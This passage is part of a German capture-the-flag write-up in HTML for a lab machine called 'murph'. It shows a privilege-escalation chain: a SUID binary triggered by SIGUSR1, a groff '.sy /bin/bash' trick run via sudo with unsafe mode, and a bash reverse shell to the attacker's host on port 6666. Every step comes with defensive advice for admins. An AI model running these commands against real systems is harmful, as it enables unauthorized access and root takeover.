+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Von dieser Shell aus werde ich das System gründlich auf PE-Vektoren enumerieren: SUID/SGID-Binaries, Cronjobs, Sudo-Berechtigungen, Dateiberechtigungen, etc. Der Fokus liegt auf dem SUID-Binary <code>/opt/murph</code>, das ich zuvor identifiziert habe.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Etablierung von Reverse Shells. Implementieren Sie TTY-Überwachung und Session-Logging auf Ihren Servern.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <!-- Beginn Privilege Escalation -->
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">terminal:5555</span>
+<span class="command">www-data@murph:~/html/uploads$</span> <span class="command">/opt/murph &</span>
+<span class="password">[1] 876</span>
+<span class="command">www-data@murph:~/html/uploads$</span> <span class="command">Waiting SIGUSR1....</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Von meiner <code>www-data</code> Shell (hier als 'terminal:5555' referenziert) starte ich das SUID-Binary <code>/opt/murph</code> im Hintergrund mit <code>/opt/murph &</code>. Die Ausgabe zeigt die Prozess-ID (PID) des gestarteten Prozesses (<code>[1] 876</code>) und die Meldung 'Waiting SIGUSR1....', die ich zuvor mit <code>strings</code> im Binary gefunden hatte. Für Laien: In einem meiner 'Befehlsfenster' starte ich das spezielle 'root'-Programm (murph) im Hintergrund, damit es läuft und wartet, ohne mein Fenster zu blockieren. Das Programm sagt, es wartet auf ein spezielles 'Signal'. Für Experten: Das SUID-Binary <code>/opt/murph</code> wird mit Root-Berechtigungen gestartet. Es wartet auf das <code>SIGUSR1</code>-Signal, wie die String-Analyse angedeutet hat. Das Starten im Hintergrund ist notwendig, um von einer anderen Shell aus das Signal senden zu können. Die PID 876 ist entscheidend, um das Signal gezielt an diesen Prozess zu senden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das SUID-Binary <code>/opt/murph</code> läuft mit Root-Rechten im Hintergrund und wartet auf das erwartete Signal. Der gefundene PE-Vektor ist bestätigt. Ich bin bereit, das Signal zu senden und Root-Rechte zu erlangen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Merken Sie sich die PID des Prozesses (876). Wechseln Sie zu einer anderen Shell, um das Signal <code>SIGUSR1</code> an diesen Prozess zu senden.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Ausführung von SUID-Binaries, insbesondere wenn sie im Hintergrund gestartet werden. Implementieren Sie Überwachung, die alarmiert, wenn Prozesse mit SUID-Berechtigungen ungewöhnliche Signale empfangen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">terminal:4445</span>
+<span class="command">www-data@murph:/opt$</span> <span class="command">kill -SIGUSR1 876</span>
+<span class="command">www-data@murph:/opt$</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Von einer *anderen* <code>www-data</code> Shell (hier als 'terminal:4445' referenziert) sende ich das Signal <code>SIGUSR1</code> an den im Hintergrund laufenden <code>/opt/murph</code> Prozess mit der PID 876, using the command <code>kill -SIGUSR1 876</code>. Der <code>kill</code> Befehl sendet ein Signal an einen Prozess mit der angegebenen PID. <code>SIGUSR1</code> ist ein benutzerdefiniertes Signal, das oft von Programmen für spezifische interne Aktionen verwendet wird. Da das Binary <code>/opt/murph</code> explizit auf dieses Signal wartet, wird erwartet, dass es nach dessen Empfang die privilegierte Aktion (wahrscheinlich eine Root-Shell) ausführt. Für Laien: In einem anderen 'Befehlsfenster' schicke ich eine spezielle 'Nachricht' (das Signal) an das laufende 'root'-Programm (murph), das darauf wartet. Das sollte das Programm 'aufwecken' und seine 'Geheimfunktion' starten. Für Experten: Das Senden von <code>SIGUSR1</code> an den laufenden SUID root Prozess mit PID 876 ist die Auslöseraktion für den Exploit. Wenn das Binary korrekt implementiert ist, sollte es nach Empfang dieses Signals eine Root-Shell spawnen oder ähnliche privilegierte Aktionen ausführen. Die Ausführung des <code>kill</code>-Befehls als <code>www-data</code> ist möglich, da normale Benutzer Signale an Prozesse senden können, deren effektive UID/GID sie teilen oder für die sie die notwendigen Berechtigungen haben (und www-data hat hier wahrscheinlich die Möglichkeit, Signale an seine eigenen Prozesse zu senden, auch wenn sie als Root laufen).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Signal <code>SIGUSR1</code> wurde erfolgreich an den SUID root Prozess gesendet. Wenn die Analyse des Binaries korrekt war, sollte dies zu einer Root-Shell oder einem anderen Root-Privileg führen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beobachten Sie die Shell, von der aus <code>/opt/murph</code> gestartet wurde (terminal:5555), auf Anzeichen einer neuen Shell oder geänderter Berechtigungen.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie Application Whitelisting oder andere Kontrollen, um die Ausführung von <code>kill</code> Befehlen durch Low-Privilege-Benutzer gegen privilegierte Prozesse zu verhindern, es sei denn, dies ist für die Systemverwaltung notwendig. Überwachen Sie die Nutzung des <code>kill</code>-Befehls und das Senden von Signalen an privilegierte Prozesse.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">terminal:5555</span>
+<span class="command">www-data@murph:~/html/uploads$</span> <span class="command">fg</span>
+<span class="command">/opt/murph</span>
+<span class="password">jen@murph:~/html/uploads$</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich kehre zu der Shell zurück, von der aus ich <code>/opt/murph</code> im Hintergrund gestartet habe ('terminal:5555') und bringe den Hintergrundprozess mit <code>fg</code> (foreground) wieder in den Vordergrund. Anstatt der erwarteten Ausgabe oder eines Fehlers, ändert sich der Prompt plötzlich zu <code>jen@murph:~/html/uploads$</code>. Dies ist der definitive Beweis dafür, dass die Ausführung von <code>/opt/murph</code> und der Empfang des <code>SIGUSR1</code>-Signals dazu geführt haben, dass die Berechtigungen auf den Benutzer <code>jen</code> gewechselt sind. Für Laien: In dem 'Befehlsfenster', wo ich das 'root'-Programm gestartet und es auf das Signal warten ließ, hole ich das Programm wieder nach vorne. Plötzlich ändert sich mein 'Name' in dem Fenster von 'www-data' zu 'jen'! Das spezielle Programm hat mir die Rechte von 'jen' gegeben! Für Experten: Das Erscheinen des Prompts <code>jen@murph:~/html/uploads$</code> in der Shell, von der aus das SUID root Binary gestartet wurde, demonstriert eine erfolgreiche Privilegien-Eskalation vom Benutzer <code>www-data</code> zum Benutzer <code>jen</code> durch Ausnutzung des SUID/SGID-Binaries <code>/opt/murph</code> in Kombination mit dem <code>SIGUSR1</code>-Signal. Dies ist ein wichtiger Schritt in der PE-Kette, auch wenn das SUID-Bit auf Root gesetzt war, führte es nur zur Eskalation auf den Benutzer <code>jen</code>. Möglicherweise verwendet das Binary <code>setuid(1000)</code> (UID von jen) nach Erhalt des Signals, oder die SGID <code>www-data</code> spielte eine unerwartete Rolle im Zusammenspiel mit den Berechtigungen des Binaries.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Privilegien-Eskalation auf den Benutzer <code>jen</code> ist erfolgreich. Obwohl das Binary SUID root hatte, wurde nur auf jen eskaliert. Dies bedeutet, dass ich nun mit den Berechtigungen von Benutzer <code>jen</code> auf dem System agiere. Ich bin einen Schritt näher an Root.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Von dieser Shell als Benutzer <code>jen</code> werde ich nun das System weiter enumerieren, um nach Möglichkeiten zur Privilegien-Eskalation von <code>jen</code> zu <code>pat</code> oder direkt zu <code>root</code> zu suchen. Dazu gehören die Prüfung von <code>sudo</code>-Berechtigungen für <code>jen</code>, SUID/SGID-Binaries, Cronjobs etc.<br><strong>Empfehlung (Admin):</strong> Untersuchen Sie den Quellcode oder führen Sie eine dynamische Analyse des SUID/SGID-Binaries <code>/opt/murph</code> durch, um zu verstehen, warum es nur auf den Benutzer <code>jen</code> eskaliert. Beheben Sie die zugrundeliegende Schwachstelle im Binary und entfernen Sie die SUID/SGID-Berechtigungen, es sei denn, dies ist absolut notwendig und sicher implementiert.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">jen@murph:~/html/uploads$</span> <span class="command">sudo -l</span>
+<span class="command">Matching Defaults entries for jen on murph:</span>
+    <span class="command">env_reset, mail_badpass,</span>
+    <span class="command">secure_path=.\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
+
+<span class="command">User jen may run the following commands on murph:</span>
+    <span class="password">(pat) NOPASSWD: /usr/bin/groff</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer <code>jen</code> prüfe ich sofort meine <code>sudo</code>-Berechtigungen mit dem Befehl <code>sudo -l</code>. Die Ausgabe zeigt, dass der Benutzer <code>jen</code> den Befehl <code>/usr/bin/groff</code> als Benutzer <code>pat</code> ausführen darf, **ohne dass eine Passworteingabe erforderlich ist** (<code>(pat) NOPASSWD: /usr/bin/groff</code>). Für Laien: Ich bin jetzt 'jen' und schaue nach, ob 'jen' spezielle 'Admin-Befehle' ausführen darf, ohne ein Passwort zu kennen. Und ja, 'jen' darf ein Programm namens 'groff' mit den Rechten des Benutzers 'pat' starten, einfach so! Für Experten: Der Fund der <code>sudo</code>-Berechtigung <code>(pat) NOPASSWD: /usr/bin/groff</code> für den Benutzer <code>jen</code> ist ein weiterer kritischer Privilegien-Eskalationsvektor. Dies ermöglicht die horizontale Privilegien-Eskalation vom Benutzer <code>jen</code> zum Benutzer <code>pat</code>, ohne das Passwort von <code>pat</code> zu kennen. Das Programm <code>groff</code> (ein Textformatierungssystem) ist ein potenzielles Ziel für die Ausführung beliebiger Befehle.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Möglichkeit, <code>/usr/bin/groff</code> als Benutzer <code>pat</code> ohne Passwort auszuführen, ist ein klarer Pfad zur Erlangung einer Shell als Benutzer <code>pat</code>. Dies ist der nächste Schritt in unserer PE-Kette.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Binary <code>/usr/bin/groff</code> auf Möglichkeiten zur Ausführung von Systembefehlen (z.B. über unsichere Parameter oder Makros). Nutzen Sie die <code>sudo</code>-Regel, um Code als Benutzer <code>pat</code> auszuführen.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie alle <code>sudo</code>-Regeln sorgfältig, insbesondere solche mit <code>NOPASSWD</code>. Erlauben Sie niemals die Ausführung von Programmen (wie Textformatierer oder Editoren) mit den Rechten eines anderen Benutzers über <code>NOPASSWD</code>, wenn diese Programme zur Ausführung von Systembefehlen missbraucht werden können.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">jen@murph:~/html/uploads$</span> <span class="command">file /usr/bin/groff</span>
+<span class="command">/usr/bin/groff: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dc15f35c7468d8ce6c867408040dcb52538e89e8, for GNU/Linux 3.2.0, stripped</span>
+
+<span class="command">jen@murph:~/html/uploads$</span> <span class="command">ls -la /usr/bin/groff</span>
+<span class="command">-rwxr-xr-x 1 root root 124288 Jan 27  2021 /usr/bin/groff</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich untersuche das Binary <code>/usr/bin/groff</code> mit <code>file</code> und <code>ls -la</code>, um seine Eigenschaften und Berechtigungen zu prüfen. Das <code>file</code>-Kommando bestätigt, dass es sich um ein standardmäßiges ausführbares Programm für Linux handelt (64-bit ELF), das dynamisch gelinkt und 'stripped' ist (Symbolinformationen wurden entfernt, was Reverse Engineering erschwert). <code>ls -la</code> zeigt, dass es Root gehört und nur vom Eigentümer (root) geschrieben werden kann, aber für alle Benutzer ausführbar ist (<code>-rwxr-xr-x</code>). Für Laien: Ich schaue mir das Programm 'groff' genauer an, das 'jen' mit 'pat'-Rechten starten darf. Es ist ein normales Programm, aber nur der 'Chef' (root) kann es verändern. Jeder darf es aber starten. Für Experten: Die Analyse bestätigt, dass <code>/usr/bin/groff</code> ein Standard-Systembinary ist. Die Berechtigungen sind unbedenklich. Das 'stripped' Binary erschwert statische Analyse im Vergleich zu <code>/opt/murph</code>. Der Fokus liegt nun darauf, ob und wie <code>groff</code> Systembefehle ausführen kann, was oft bei Textformatierungsprogrammen möglich ist, die externe Kommandos einbinden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <code>/usr/bin/groff</code> ist ein Standardbinary mit unbedenklichen Berechtigungen. Die Ausnutzbarkeit hängt davon ab, ob <code>groff</code> unsicher konfigurierte Makros oder Funktionen zur Ausführung von Systembefehlen bietet, wenn es eine Formatierungsdatei verarbeitet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Recherchieren Sie nach bekannten Möglichkeiten, Befehle über <code>groff</code> auszuführen, insbesondere in Verbindung mit <code>sudo</code>-Berechtigungen. Erstellen Sie eine roff-Datei mit einem eingebetteten Shell-Befehl und versuchen Sie, diese mit <code>sudo -u pat /usr/bin/groff</code> zu verarbeiten.<br><strong>Empfehlung (Admin):</strong> Seien Sie vorsichtig bei <code>sudo</code>-Regeln für Textverarbeitungs- oder Formatierungstools. Überprüfen Sie deren Konfiguration und stellen Sie sicher, dass die Ausführung externer Befehle deaktiviert ist, wenn sie mit erhöhten Rechten gestartet werden dürfen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">jen@murph:/tmp$</span>  <span class="command">echo '.sy /bin/bash' > /tmp/exploit.roff</span>
+<span class="command">jen@murph:/tmp$</span> <span class="command">sudo -u pat /usr/bin/groff /tmp/exploit.roff</span>
+<span class="command">troff: /tmp/exploit.roff:1: .sy request not allowed in safer mode</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, Befehle über <code>groff</code> auszuführen. Dazu erstelle ich eine temporäre Datei namens <code>/tmp/exploit.roff</code> mit dem Inhalt <code>.sy /bin/bash</code>. Die <code>.sy</code> Makro in roff/troff wird oft verwendet, um Systembefehle auszuführen. Ich speichere diese Datei im temporären Verzeichnis <code>/tmp/</code>, in das ich als <code>jen</code> schreiben darf. Dann versuche ich, diese Datei mit <code>sudo -u pat /usr/bin/groff /tmp/exploit.roff</code> als Benutzer <code>pat</code> über die gefundene <code>sudo</code>-Regel zu verarbeiten. Die Ausgabe <code>troff: /tmp/exploit.roff:1: .sy request not allowed in safer mode</code> zeigt, dass <code>groff</code> standardmäßig im 'sichereren Modus' läuft, der die Ausführung des <code>.sy</code> Makros blockiert. Für Laien: Ich habe eine kleine 'Anleitungsdatei' für das Programm 'groff' erstellt, die sagt, es soll ein 'Befehlsfenster' öffnen. Ich lasse 'jen' dieses mit 'pat'-Rechten starten und die Anleitungsdatei lesen. Aber 'groff' sagt, es darf den Befehl nicht ausführen, weil es im 'sicheren Modus' ist. Für Experten: Das <code>.sy</code> Makro ist ein bekannter Vektor zur Befehlsausführung in troff/groff. Die Fehlermeldung 'not allowed in safer mode' ist eine direkte Bestätigung, dass <code>groff</code> Sicherheitsmaßnahmen gegen solche Makros implementiert, aber impliziert auch, dass es einen 'unsicheren' Modus geben könnte.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das <code>.sy</code> Makro funktioniert nicht im Standardmodus. Die Fehlermeldung ist jedoch hilfreich, da sie auf einen 'sichereren Modus' hinweist, was bedeutet, dass es möglicherweise einen Weg gibt, diesen zu deaktivieren und den 'unsicheren Modus' zu aktivieren, in dem <code>.sy</code> erlaubt ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie in der Hilfe oder Dokumentation von <code>groff</code> nach einem Parameter oder einer Option, um den 'sichereren Modus' zu deaktivieren und die Ausführung von Systembefehlen (<code>.sy</code> Makro) zu ermöglichen. Prüfen Sie die Hilfe mit <code>sudo -u pat groff -h</code>.<br><strong>Empfehlung (Admin):</strong> Vertrauen Sie nicht auf Standardeinstellungen. Überprüfen Sie die Konfigurationen von Programmen, die mit erhöhten Rechten ausgeführt werden dürfen, und deaktivieren Sie explizit unsichere Features wie die Ausführung externer Befehle.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">jen@murph:/tmp$</span> <span class="command">sudo -u pat groff -h</span>
+<span class="command">usage: groff [-abceghijklpstvzCEGNRSUVXZ] [-dcs] [-ffam] [-mname] [-nnum]</span>
+<span class="command">       [-olist] [-rcn] [-wname] [-Darg] [-Fdir] [-Idir] [-Karg] [-Larg]</span>
+<span class="command">       [-Mdir] [-Parg] [-Tdev] [-Wname] [files...]</span>
+<span class="password">...</span>
+<span class="password">..</span>
+<span class="command">-U	enable unsafe mode</span>
+<span class="command">-V	print commands on stdout instead of running them</span>
+<span class="command">-Wname	inhibit warning name</span>
+<span class="command">-X	use X11 previewer rather than usual postprocessor</span>
+<span class="command">-Z	don't postprocess</span>
+
+<span class="command">jen@murph:/tmp$</span> <span class="command">sudo -u pat /usr/bin/groff -U /tmp/exploit.roff</span>
+<span class="password">pat@murph:/tmp$</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich prüfe die Hilfe des <code>groff</code>-Befehls mit <code>sudo -u pat groff -h</code> (Ausführung als <code>pat</code> via sudo, um sicherzustellen, dass die Hilfe in diesem Kontext relevant ist). Die Hilfe listet verschiedene Parameter auf. Ich suche nach etwas, das mit 'safe mode' oder 'unsafe mode' zu tun hat, basierend auf der vorherigen Fehlermeldung. Die Option <code>-U enable unsafe mode</code> wird gefunden. Dann führe ich <code>groff</code> erneut aus, diesmal mit dem Parameter <code>-U</code>: <code>sudo -u pat /usr/bin/groff -U /tmp/exploit.roff</code>. Ich übergebe wieder die Datei <code>/tmp/exploit.roff</code>, die das <code>.sy /bin/bash</code> Makro enthält, und führe den Befehl als Benutzer <code>pat</code> aus. Die Ausgabe ist nun der Prompt <code>pat@murph:/tmp$</code>. Für Laien: Ich habe in der Hilfe von 'groff' nachgeschaut und eine Option gefunden, die den 'sicheren Modus' ausschaltet (die Option '-U'). Ich starte 'groff' dann nochmal als 'pat' mit dieser Option und meiner 'Anleitungsdatei'. Und fantastisch – statt einer Fehlermeldung bekomme ich jetzt das 'Befehlsfenster' des Benutzers 'pat'! Ich bin jetzt 'pat'! Für Experten: Das Auffinden und Verwenden der <code>-U</code> Option deaktiviert den sicheren Modus von <code>groff</code> und erlaubt die Ausführung des <code>.sy</code> Makros. Das <code>.sy /bin/bash</code> Makro wird ausgeführt und startet eine Bash-Shell. Da <code>groff</code> über <code>sudo -u pat</code> ausgeführt wurde, läuft die neue Shell mit den Berechtigungen des Benutzers <code>pat</code>. Dies ist eine erfolgreiche Privilegien-Eskalation von <code>jen</code> zu <code>pat</code>.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Privilegien-Eskalation auf den Benutzer <code>pat</code> ist erfolgreich. Ich habe nun eine interaktive Shell mit den Berechtigungen dieses Benutzers. Dies ist der vorletzte Schritt auf dem Weg zu Root.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Von dieser Shell als Benutzer <code>pat</code> werde ich nun das System weiter enumerieren, um nach Möglichkeiten zur Privilegien-Eskalation von <code>pat</code> zu <code>root</code> zu suchen. Dies beinhaltet die Prüfung von <code>sudo</code>-Berechtigungen für <code>pat</code>, SUID/SGID-Binaries, Cronjobs etc. Der Fund der Root-Flag ist jetzt nur einen Schritt entfernt.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Standardkonfigurationen von Systemprogrammen, die über <code>sudo</code> mit erhöhten Rechten ausgeführt werden dürfen. Deaktivieren Sie die Ausführung externer Befehle, wenn möglich, oder verhindern Sie die Nutzung von Optionen wie <code>-U</code> durch die <code>sudo</code>-Regel selbst (z.B. mittels <code> ограничений </code> für Parameter). Überwachen Sie die Ausführung von <code>groff</code> mit ungewöhnlichen Optionen oder im unsicheren Modus.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">pat@murph:/opt$</span> <span class="command">id</span>
+<span class="command">grops:<standard input>:1: fatal error: the first command must be 'x T'</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, meine Benutzer-ID in der neuen Shell als Benutzer <code>pat</code> zu bestätigen, indem ich den Befehl <code>id</code> ausführe. Die Ausgabe zeigt jedoch eine Fehlermeldung im Zusammenhang mit 'grops' und 'fatal error: the first command must be 'x T''. Dies deutet darauf hin, dass die Shell, die ich über das <code>.sy /bin/bash</code> Makro in <code>groff</code> erhalten habe, nicht vollständig initialisiert oder interaktiv ist, möglicherweise weil sie immer noch im Kontext der <code>groff</code>-Verarbeitung läuft. Die Fehlermeldung selbst stammt wahrscheinlich von einem anderen Programm (möglicherweise <code>grops</code>, das von groff aufgerufen wird), das die Eingabe 'id' erhält, aber etwas anderes erwartet. Für Laien: In dem 'Befehlsfenster' des Benutzers 'pat', das ich gerade bekommen habe, versuche ich, zu prüfen, wer ich bin (mit dem Befehl 'id'), aber das Fenster antwortet mit einer komischen Fehlermeldung. Das Fenster ist nicht ganz 'normal'. Für Experten: Dies ist ein bekanntes Verhalten, wenn eine Shell über ein Makro in einem Formatierungsprogramm wie groff gespawnt wird. Die Standard-Input/Output-Streams sind möglicherweise nicht korrekt mit einem vollwertigen TTY verbunden, was zu Problemen mit interaktiven Befehlen oder Shell-Initialisierungsskripten führt. Der Befehl <code>id</code> wurde wahrscheinlich an ein unerwartetes Sub-Programm innerhalb der groff-Kette weitergeleitet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Obwohl die <code>pat</code>-Shell nicht voll funktionsfähig für interaktive Befehle zu sein scheint, habe ich prinzipiell Code-Ausführung als Benutzer <code>pat</code>. Um eine stabilere Shell zu erhalten, werde ich eine neue Reverse Shell von dieser instabilen Shell aus zu meinem Kali-System initiieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Initiieren Sie sofort eine neue Reverse Shell von dieser instabilen <code>pat</code>-Shell aus, indem Sie einen Shell-Code (z.B. Bash Reverse Shell) ausführen, der sich zu einem neuen Listener auf Ihrem Kali-System verbindet. Verwenden Sie dafür einen separaten Port.<br><strong>Empfehlung (Admin):</strong> Dies ist ein Hinweis darauf, dass Systembefehle über groff ausgeführt wurden. Überwachen Sie die Prozessbäume und Systemaufrufe von Programmen, die über <code>sudo</code> mit erhöhten Rechten ausgeführt werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">pat@murph:/opt$</span> <span class="command">bash -c 'bash -i >& /dev/tcp/192.168.2.199/6666 0>&1'</span></pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um eine stabile Shell als Benutzer <code>pat</code> zu erhalten, starte ich von der aktuellen instabilen Shell aus eine Reverse Shell zu meinem Kali-System auf Port 6666. Ich verwende den Befehl <code>bash -c 'bash -i >& /dev/tcp/192.168.2.199/6666 0>&1'</code>. Dieser Bash-Befehl startet eine neue interaktive Bash-Instanz (<code>bash -i</code>) und leitet deren Standard-Input, -Output und -Error über eine TCP-Verbindung (<code>/dev/tcp/192.168.2.199/6666</code>) zu meinem Kali-System (<code>192.168.2.199</code>) auf Port 6666 um. Für Laien: In dem 'Befehlsfenster' von 'pat', das nicht richtig funktioniert, sage ich dem Computer: 'Rufe meinen Computer auf einer anderen 'Telefonleitung' (Port 6666) an, und gib mir dann das 'Befehlsfenster' (Shell) von 'pat' über diese Leitung'. Für Experten: Dies ist der gleiche Bash-Reverse-Shell-Befehl, den ich zuvor als <code>www-data</code> verwendet habe, nun aber initiiert aus der <code>pat</code>-Shell. Er dient dazu, eine zuverlässige, interaktive Shell zu erhalten, die nicht durch die Einschränkungen der Shell beeinträchtigt wird, die über das groff-Makro gespawnt wurde. Ein Netcat-Listener auf Port 6666 auf meinem Kali-System ist erforderlich, um diese Verbindung zu empfangen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl zur Initiierung der Reverse Shell ist korrekt. Seine Ausführung sollte mir eine stabile, interaktive Shell als Benutzer <code>pat</code> verschaffen. Dies ist der nächste Schritt in der PE-Kette.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass ein Netcat-Listener auf Port 6666 auf Ihrem Kali-System läuft. Führen Sie diesen Befehl aus und warten Sie auf die eingehende Verbindung in Ihrem Listener.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehende Verbindungen und implementieren Sie Egress-Filterung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 6666</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 6666 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.50] 39350</span>
+<span class="password">pat@murph:/opt$</span> <span class="command">id</span>
+<span class="command">id</span>
+<span class="password">uid=1001(pat) gid=1001(pat) groups=1001(pat)</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich zeige die Ausgabe meines Netcat-Listeners auf Port 6666 auf meinem Kali-System. Nachdem ich den Bash-Reverse-Shell-Befehl in der <code>pat</code>-Shell ausgeführt habe, empfängt mein Listener eine Verbindung vom Zielsystem (<code>connect to ... [192.168.2.50] 39350</code>). Der Prompt <code>pat@murph:/opt$</code> erscheint, was anzeigt, dass ich erfolgreich eine interaktive Shell als Benutzer <code>pat</code> erhalten habe und mich im Verzeichnis <code>/opt</code> befinde. Ich bestätige meine Identität mit dem Befehl <code>id</code>, der die Ausgabe <code>uid=1001(pat) gid=1001(pat) groups=1001(pat)</code> zurückgibt. Für Laien: Meine 'Telefonleitung' 6666 hat geklingelt, ich habe abgenommen, und jetzt habe ich ein normales 'Befehlsfenster' (Shell) vom Benutzer 'pat' direkt auf meinem Bildschirm. Ich prüfe, wer ich bin, und der Computer sagt, ich bin 'pat'. Für Experten: Der erfolgreiche Empfang der Reverse Shell auf Port 6666 mit dem Prompt <code>pat@murph:/opt$</code> und die Bestätigung der UID 1001 via <code>id</code> beweisen die erfolgreiche Erlangung einer stabilen, interaktiven Shell als Benutzer <code>pat</code>. Dies ist der letzte Schritt vor der finalen Eskalation zu Root.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die stabile Shell als Benutzer <code>pat</code> wurde erfolgreich etabliert. Dies ist die vorletzte Stufe der Privilegien-Eskalation. Ich bin nun bereit, den finalen PE-Vektor zu nutzen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Von dieser Shell aus werde ich die <code>sudo</code>-Berechtigungen für den Benutzer <code>pat</code> prüfen, da dies der wahrscheinlichste verbleibende PE-Vektor zu Root ist.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Reverse Shells und implementieren Sie Egress-Filterung. Beschränken Sie die Berechtigungen des Benutzers <code>pat</code> auf das Notwendigste.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">pat@murph:/opt$</span> <span class="command">sudo -l</span>
+<span class="command">Matching Defaults entries for pat on murph:</span>
+    <span class="command">env_reset, mail_badpass,</span>
+    <span class="command">secure_path=.\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
+
+<span class="command">User pat may run the following commands on murph:</span>
+    <span class="password">(root) NOPASSWD: /usr/bin/login</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer <code>pat</code> prüfe ich meine <code>sudo</code>-Berechtigungen mit dem Befehl <code>sudo -l</code>. Die Ausgabe listet die Befehle auf, die der Benutzer <code>pat</code> über <code>sudo</code> ausführen darf. Ich finde den Eintrag <code>(root) NOPASSWD: /usr/bin/login</code>. Dies bedeutet, dass der Benutzer <code>pat</code> den Befehl <code>/usr/bin/login</code> als Benutzer <code>root</code> ausführen darf, **ohne dass eine Passworteingabe erforderlich ist** (<code>NOPASSWD</code>). Für Laien: Ich bin jetzt 'pat' und schaue, ob 'pat' spezielle 'Admin-Befehle' ausführen darf, ohne sein Passwort zu kennen. Und ja, 'pat' darf das Programm 'login' mit den Rechten des Super-Administrators (root) starten, einfach so! Das ist der Schlüssel, um 'root' zu werden! Für Experten: Der Fund der <code>sudo</code>-Berechtigung <code>(root) NOPASSWD: /usr/bin/login</code> für den Benutzer <code>pat</code> ist der finale und direkteste Privilegien-Eskalationsvektor zu Root. Die Möglichkeit, das <code>login</code>-Binary als Root ohne Passwort auszuführen, ist extrem gefährlich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Sudo-Eintrag für <code>/usr/bin/login</code> als Root mit NOPASSWD ist der entscheidende PE-Pfad. Dies ermöglicht die direkte Erlangung einer Root-Shell.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist die Ausnutzung dieser Sudo-Regel, um eine Root-Shell zu erlangen. Recherchieren Sie, wie das <code>/usr/bin/login</code> Binary missbraucht werden kann, insbesondere in Kombination mit <code>sudo</code> und Root-Berechtigungen. Der Parameter <code>-f</code> könnte relevant sein.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie alle <code>sudo</code>-Regeln sorgfältig. <code>NOPASSWD</code> sollte niemals für Binaries verwendet werden, die zur Erlangung einer Shell oder zur Authentifizierung als ein anderer Benutzer missbraucht werden können (wie <code>login</code>, <code>su</code>, Shell-Interpretern etc.). Dies ist eine kritische Fehlkonfiguration, die umgehend behoben werden muss.</p>
+
+            <section id="proof-of-concept">
+                 <h2>Proof of Concept: Direkte Root-Anmeldung über Sudo und login -f</h2>
